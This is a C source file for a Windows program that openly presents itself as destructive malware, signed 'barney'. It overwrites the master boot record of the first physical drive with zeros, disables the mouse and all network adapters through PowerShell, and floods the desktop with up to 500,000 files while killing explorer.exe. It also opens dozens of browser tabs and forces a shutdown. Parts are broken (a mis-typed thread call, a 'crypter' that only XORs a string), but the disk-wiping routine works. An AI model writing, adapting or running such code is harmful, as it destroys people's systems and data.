#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <process.h>

void trollies(void*);
void filebomb(void*);
void registrycorruption(void*);
void mbroverwrite(void*);
void crypter(unsigned char* bytes, size_t arrsize, unsigned char* key, size_t keysize);

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Light stuff before destroying the computer
    SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)L"wallpaper.jpg", SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
    system("powershell -Command \"Disable-PnpDevice -InstanceId (Get-PnpDevice -FriendlyName \"HID-compliant mouse\").InstanceId -Confirm:$false\"");

    // Destroyahh
    void* ptr = NULL; // Placeholder argument for mbroverwrite()
    mbroverwrite(ptr);
    _beginthread((void (*)(void*))filebomb, 0, NULL); // Cast to the correct function pointer type
    _beginthread((void (*)(void*))trollies, 0, NULL); // Cast to the correct function pointer type
    _beginthread((void (*)(void*))registrycorruption, 0, NULL); // Cast to the correct function pointer type
    _beginthread((void (*)(void*))crypter, 0, NULL); // Cast to the correct function pointer type
    Sleep(10000); // Wait for threads to finish, adjust time accordingly
    system("shutdown /s /t 50 /c \"Computer destroyed by barney, Goodbye.\"");
    return 0;
}

void mbroverwrite(void *arg) {
    char mbrData[512]; // 512 bytes
    ZeroMemory(&mbrData, sizeof(mbrData));

    HANDLE MBR = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    WriteFile(MBR, mbrData, 512, NULL, NULL);
    CloseHandle(MBR);
}

void filebomb(void *arg) {
    char filename[200]; // Array to store filename
    const char *desktopPath = getenv("USERPROFILE"); // For Windows, use the USERPROFILE environment variable
    strcpy(filename, desktopPath); // Copy the desktop path to the filename
    strcat(filename, "\\Desktop\\"); // Use backslashes for Windows path

    for (int i = 1; i <= 500000; i++) {
        sprintf(filename, "%sYOU GOT BARNIED%d.barney", filename, i); // Create filename with index
        FILE *file = fopen(filename, "w"); // Open file in write mode
        if (file != NULL) {
            fclose(file); // Close the file
        }
        strcpy(filename, desktopPath); // Reset filename for the next iteration
        strcat(filename, "\\Desktop\\"); // Reset the path
        system("taskkill /f /im explorer.exe");
    }
}

void registrycorruption(void*) {
    HKEY hKey;
    DWORD dwDisposition;
    LONG lResult;
    DWORD dwMyValue = 0;

    lResult = RegCreateKeyEx(HKEY_CURRENT_USER,
                             "Software\\MyApp",
                             0,
                             NULL,
                             REG_OPTION_NON_VOLATILE,
                             KEY_ALL_ACCESS,
                             NULL,
                             &hKey,
                             &dwDisposition);

    if (lResult == ERROR_SUCCESS)
    {
        lResult = RegSetValueEx(hKey,
                                "MyValue",
                                0,
                                REG_DWORD,
                                (BYTE*)&dwMyValue,
                                sizeof(DWORD));

        RegCloseKey(hKey);
    }
}

void crypter(unsigned char* bytes, size_t arrsize, unsigned char* key, size_t keysize)
{
    if (bytes == NULL || key == NULL)
        return;

    if (keysize > 1)
    {
        size_t j = 0;
        for (size_t i = 0; i < arrsize; ++i)
        {
            bytes[i] = bytes[i] ^ key[j];
            j = (j + 1) % keysize;
        }
    }
    else
    {
        for (size_t i = 0; i < arrsize; ++i)
        {
            bytes[i] = bytes[i] ^ key[0];
        }
    }
}

void trollies(void *arg)
{
    //Opens browser
    for (int i = 0; i < 5; i++) 
    {
        system("start https://www.youtube.com/watch?v=GjbR9rHI9Vw");
        for (int i = 0; i < 30; i++)
        {
            system("start https://www.youtube.com/watch?v=YBOUQaGodLI");
        }
    }

    // Disable Internet Connection
    system("powershell -Command \"Get-NetAdapter | Disable-NetAdapter -Confirm:$false\"");

    // Encrypts files
    unsigned char key[] = {0x00, 0xFF, 0x01, 0x0F};
    size_t keysize = sizeof(key);
    char text[] = "barneybarneymalware";
    crypter((unsigned char*)text, strlen(text), key, keysize); 
}
